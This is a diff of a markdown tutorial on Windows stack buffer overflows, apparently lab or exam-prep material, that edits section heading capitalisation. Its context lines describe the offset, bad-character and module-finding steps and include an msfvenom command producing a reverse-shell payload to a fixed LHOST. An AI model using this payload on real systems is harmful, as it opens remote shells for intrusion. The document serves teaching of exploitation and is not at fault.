@@ -29,7 +29,7 @@ You will get a number of bytes _-where the program crashed-_, then you will used
 
 _____________________________________________________________
 
-## 3- Finding the offset (EIP)
+## 3- Finding the Offset (EIP)
 after editing the offset and firing up the `offset.py`, to identify the overwritten EIP we have to take the hex for it. then we will use it with `msf-pattern_offset -l <BYTES> -q <EIP's HEX>`.
 
 the offset will come up, and that what we are gonna use to overwrite the EIP.
@@ -44,7 +44,7 @@ if the last bytes(of EIP) were Bs _-42424242-_ then we overwrote the EIP success
 _____________________________________________________________
 
 
-## 5 - finding bad characters
+## 5 - f  Finding Bad Characters
 
 here we will try to identify which characters are bad for the shellcode (breaks the code), in order to avoid them. 
 
@@ -56,7 +56,7 @@ then follow the ESP in dump and see if there's any badchars (Something that does
 _____________________________________________________________
 
 
-## 6- finding the right module (The vulnerable stack)
+## 6- Finding the Right Module (The vulnerable Service)
 
 from github download mona.py and leave it at "C:\programfiles(x86)\immunityinc\immunitydebugger\pycommands"
 
@@ -77,7 +77,7 @@ then run `module_finder.py`
 _____________________________________________________________
 
 
-## 7- generating shellcoding and gaining root
+## 7- Generating Shellcoding and Gaining Root
 
 generate a payload with msfvenom in Kali
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.5.108 LPOST=9999 EXITFUNC=thread -f c -a x86 -b "\x00"`
